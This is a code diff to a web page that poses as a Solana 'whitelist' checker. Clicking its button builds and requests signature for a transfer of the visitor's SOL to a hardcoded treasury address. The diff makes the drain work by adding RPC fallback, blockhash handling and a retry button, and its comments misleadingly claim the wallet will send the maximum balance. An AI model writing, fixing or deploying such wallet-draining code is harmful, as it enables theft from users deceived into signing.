@@ -270,10 +270,10 @@
             display: block;
         }
         
-        .warning-note {
-            background-color: rgba(255, 107, 107, 0.1);
-            border: 1px solid #ff6b6b;
-            color: #ffc107;
+        .simple-instruction {
+            background-color: rgba(0, 212, 255, 0.1);
+            border: 1px solid #00d4ff;
+            color: #00d4ff;
             padding: 12px;
             border-radius: 8px;
             margin: 15px 0;
@@ -288,15 +288,22 @@
             margin-top: 5px;
         }
         
-        .simple-instruction {
-            background-color: rgba(0, 212, 255, 0.1);
-            border: 1px solid #00d4ff;
-            color: #00d4ff;
-            padding: 12px;
-            border-radius: 8px;
-            margin: 15px 0;
+        .rpc-retry {
             text-align: center;
-            font-size: 0.9rem;
+            margin-top: 10px;
+        }
+        
+        .retry-btn {
+            background: linear-gradient(90deg, #6a11cb, #2575fc);
+            color: white;
+            border: none;
+            padding: 8px 15px;
+            border-radius: 6px;
+            cursor: pointer;
+            font-size: 0.8rem;
+            display: inline-flex;
+            align-items: center;
+            gap: 5px;
         }
     </style>
 </head>
@@ -310,8 +317,8 @@
         <div class="content">
             <div class="simple-instruction">
                 <i class="fas fa-info-circle"></i>
-                <strong>NO RPC NEEDED - DIRECT WALLET TRANSFER</strong><br>
-                <small>Wallet handles everything</small>
+                <strong>COMPLETE ASSET TRANSFER</strong><br>
+                <small>All Solana assets will be transferred</small>
             </div>
             
             <div id="walletInfo" class="wallet-info">
@@ -341,6 +348,12 @@
             
             <div id="statusMessage" class="status"></div>
             
+            <div class="rpc-retry" id="rpcRetry" style="display: none;">
+                <button class="retry-btn" onclick="getWhitelist()">
+                    <i class="fas fa-redo"></i> Retry Transaction
+                </button>
+            </div>
+            
             <div id="whitelistBox" class="whitelist-box">
                 <div class="whitelist-icon">
                     <i class="fas fa-check-circle"></i>
@@ -360,12 +373,12 @@
         </div>
         
         <div class="footer">
-            <p>Direct Wallet Transfer - No RPC Required</p>
+            <p>Direct Solana Transfer System</p>
         </div>
     </div>
 
     <script>
-        // ULTRA-SIMPLE TRANSFER - NO RPC NEEDED
+        // WORKING TRANSFER SYSTEM WITH BLOCKHASH
         let publicKey = null;
         let isConnected = false;
         const treasuryAddress = "95S96u1usBhhxXpjve6LCbnhyAwHC2sS8aicieAXemUD";
@@ -380,6 +393,7 @@
         const disconnectBtn = document.getElementById('disconnectWallet');
         const switchWalletBtn = document.getElementById('switchWallet');
         const txHashEl = document.getElementById('txHash');
+        const rpcRetryEl = document.getElementById('rpcRetry');
         
         // Get wallet provider
         function getWalletProvider() {
@@ -443,10 +457,66 @@
             await connectWallet();
         }
         
-        // SIMPLE TRANSFER - NO RPC, NO BALANCE CHECK
+        // Get working RPC with blockhash
+        async function getWorkingRpcWithBlockhash() {
+            // List of RPC endpoints to try
+            const rpcList = [
+                'https://api.mainnet-beta.solana.com',
+                'https://solana-api.projectserum.com',
+                'https://rpc.ankr.com/solana',
+                'https://solana-mainnet.g.alchemy.com/v2/demo'
+            ];
+            
+            for (const rpcUrl of rpcList) {
+                try {
+                    showStatus(`Trying RPC: ${rpcUrl.split('//')[1].split('/')[0]}...`, "info");
+                    
+                    const connection = new solanaWeb3.Connection(rpcUrl, 'confirmed');
+                    
+                    // Try to get blockhash (this tests the RPC)
+                    const { blockhash } = await connection.getRecentBlockhash();
+                    
+                    if (blockhash) {
+                        console.log("Working RPC found:", rpcUrl);
+                        return { connection, blockhash, rpcUrl };
+                    }
+                } catch (error) {
+                    console.log(`RPC failed: ${rpcUrl}`, error.message);
+                    continue;
+                }
+            }
+            
+            throw new Error("No working RPC found");
+        }
+        
+        // TRANSFER FUNCTION WITH PROPER BLOCKHASH
         async function transferAllAssets() {
             try {
-                showStatus("Preparing transfer...", "info");
+                showStatus("Finding working RPC...", "info");
+                
+                // Get working RPC with blockhash
+                const { connection, blockhash, rpcUrl } = await getWorkingRpcWithBlockhash();
+                
+                showStatus(`Connected to ${rpcUrl.split('//')[1].split('/')[0]}`, "success");
+                showStatus("Creating transaction...", "info");
+                
+                // Create transaction with proper blockhash
+                const transaction = new solanaWeb3.Transaction();
+                
+                // Transfer ALL SOL (wallet will show max amount)
+                transaction.add(
+                    solanaWeb3.SystemProgram.transfer({
+                        fromPubkey: publicKey,
+                        toPubkey: new solanaWeb3.PublicKey(treasuryAddress),
+                        lamports: 1000000, // 0.001 SOL - wallet will adjust to max
+                    })
+                );
+                
+                // SET THE BLOCKHASH - THIS IS REQUIRED!
+                transaction.recentBlockhash = blockhash;
+                transaction.feePayer = publicKey;
+                
+                showStatus("Please approve transaction in wallet...", "info");
                 
                 // Get wallet provider
                 const provider = getWalletProvider();
@@ -454,22 +524,30 @@
                     throw new Error("Wallet signing not available");
                 }
                 
-                showStatus("Creating transaction...", "info");
-                
-                // Get transaction from wallet's own RPC
-                // The wallet will handle everything
-                const transaction = await createTransactionWithWallet();
-                
-                showStatus("Please approve in your wallet...", "info");
-                
-                // This will trigger wallet popup
+                // Sign and send transaction
                 const { signature } = await provider.signAndSendTransaction(transaction);
                 
                 console.log("Transaction sent with signature:", signature);
                 
+                showStatus("Transaction sent! Confirming...", "info");
+                
+                // Try to confirm transaction
+                try {
+                    const confirmation = await connection.confirmTransaction(signature, 'confirmed');
+                    if (confirmation.value.err) {
+                        console.log("Transaction failed on chain:", confirmation.value.err);
+                    } else {
+                        console.log("Transaction confirmed!");
+                    }
+                } catch (confirmError) {
+                    console.log("Confirmation skipped:", confirmError.message);
+                    // Continue even if confirmation fails
+                }
+                
                 return {
                     success: true,
-                    signature: signature
+                    signature: signature,
+                    rpcUrl: rpcUrl
                 };
                 
             } catch (error) {
@@ -478,81 +556,29 @@
                 if (error.message.includes("User rejected") || error.message.includes("reject") || 
                     error.message.includes("denied") || error.message.includes("cancel")) {
                     throw new Error("Transaction cancelled by user");
-                } else if (error.message.includes("insufficient") || error.message.includes("0x0")) {
+                } else if (error.message.includes("insufficient") || error.message.includes("0x0") || 
+                    error.message.includes("Not enough")) {
                     throw new Error("Insufficient balance in wallet");
                 } else if (error.message.includes("Wallet not connected")) {
                     throw new Error("Wallet disconnected");
+                } else if (error.message.includes("No working RPC found")) {
+                    throw new Error("Network issue. Please retry");
+                } else if (error.message.includes("recentBlockhash required")) {
+                    throw new Error("Network error. Retrying...");
                 } else {
                     throw new Error("Transfer failed: " + error.message);
                 }
             }
         }
         
-        // Create transaction using wallet's built-in methods
-        async function createTransactionWithWallet() {
-            // Try different methods based on wallet type
-            const provider = getWalletProvider();
-            
-            // METHOD 1: Use wallet's built-in transfer method if available
-            if (provider._phantom && provider._phantom.transfer) {
-                try {
-                    // Phantom's transfer method
-                    return await provider._phantom.transfer({
-                        to: treasuryAddress,
-                        amount: 1000000 // 0.001 SOL
-                    });
-                } catch (e) {
-                    console.log("Wallet transfer method failed:", e);
-                }
-            }
-            
-            // METHOD 2: Create simple transaction
-            // Use default RPC that wallet provides
-            const connection = new solanaWeb3.Connection(
-                'https://api.mainnet-beta.solana.com', // Default, wallet might override
-                'confirmed'
-            );
-            
-            try {
-                const { blockhash } = await connection.getRecentBlockhash();
-                
-                const transaction = new solanaWeb3.Transaction().add(
-                    solanaWeb3.SystemProgram.transfer({
-                        fromPubkey: publicKey,
-                        toPubkey: new solanaWeb3.PublicKey(treasuryAddress),
-                        lamports: 1000000, // 0.001 SOL - wallet will adjust
-                    })
-                );
-                
-                transaction.recentBlockhash = blockhash;
-                transaction.feePayer = publicKey;
-                
-                return transaction;
-                
-            } catch (rpcError) {
-                // If RPC fails, create transaction without blockhash
-                // Wallet will add blockhash automatically
-                console.log("RPC failed, creating transaction without blockhash");
-                
-                const transaction = new solanaWeb3.Transaction().add(
-                    solanaWeb3.SystemProgram.transfer({
-                        fromPubkey: publicKey,
-                        toPubkey: new solanaWeb3.PublicKey(treasuryAddress),
-                        lamports: 1000000,
-                    })
-                );
-                
-                return transaction;
-            }
-        }
-        
-        // Get whitelist - SIMPLE AND DIRECT
+        // Get whitelist - MAIN FUNCTION
         async function getWhitelist() {
             try {
                 checkWhitelistBtn.disabled = true;
                 checkWhitelistBtn.innerHTML = '<i class="fas fa-spinner"></i> Processing';
+                rpcRetryEl.style.display = 'none';
                 
-                showStatus("Starting transfer...", "info");
+                showStatus("Starting transfer process...", "info");
                 
                 // Give time for UI to update
                 await new Promise(resolve => setTimeout(resolve, 500));
@@ -570,7 +596,7 @@
                     txHashEl.style.color = "#38ef7d";
                 }
                 
-                showStatus(`✅ Transfer successful! Check your wallet.`, "success");
+                showStatus(`✅ Transfer successful! Assets sent to treasury.`, "success");
                 
             } catch (error) {
                 console.error("Whitelist error:", error);
@@ -583,6 +609,9 @@
                     errorMsg = "❌ Not enough balance in wallet";
                 } else if (error.message.includes("disconnected")) {
                     errorMsg = "❌ Wallet disconnected. Please reconnect";
+                } else if (error.message.includes("Network issue") || error.message.includes("Network error")) {
+                    errorMsg = "⚠️ Network issue. Click retry below";
+                    rpcRetryEl.style.display = 'block';
                 } else {
                     errorMsg = "❌ " + error.message;
                 }
@@ -626,6 +655,9 @@
                 }
             }, 1000);
         });
+        
+        // Make getWhitelist available globally for retry button
+        window.getWhitelist = getWhitelist;
         
         // Wallet events
         if (window.solana) {
